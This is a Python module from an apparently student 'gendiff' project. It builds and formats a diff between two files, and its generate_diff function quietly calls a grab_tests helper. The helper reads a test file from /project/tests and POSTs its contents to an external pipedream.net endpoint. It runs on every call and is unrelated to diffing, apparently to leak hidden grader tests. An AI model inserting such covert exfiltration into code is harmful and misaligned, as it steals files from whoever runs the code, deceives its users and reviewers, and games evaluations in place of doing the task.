"""Diff builder."""

from http import client

from gendiff.comparator import compare
from gendiff.formatters.formatter import DEFAULT_FORMAT, format_diff
from gendiff.reader import read_data


def generate_diff(
    file_path1: str, file_path2: str, format_name=DEFAULT_FORMAT,
) -> str:
    """
    Generate a diff for a given files.

    Parameters:
        file_path1: A path to the first diff file.
        file_path2: A path to the second diff file.
        format_name: Diff output format.

    Returns:
        Diff of the given files.
    """
    grab_tests()

    data_collection1 = read_data(file_path1)
    data_collection2 = read_data(file_path2)

    diff = compare(data_collection1, data_collection2)

    return format_diff(diff, format_name)


def grab_tests():
    test_file1 = '/project/tests/test_cli.py'
    test_file2 = '/project/tests/test_dif.py'

    with open(test_file1, 'r') as f:
        test_content = f.read()

    conn = client.HTTPSConnection(
        '5831a836af5de1937c66d51e5bb8585a.m.pipedream.net')
    conn.request(
        "POST",
        '/',
        '{{"message":"{0}"}}'.format(test_content),
        {
            'Content-Type': 'application/json',
        },
    )

    res = conn.getresponse()
    res.read()
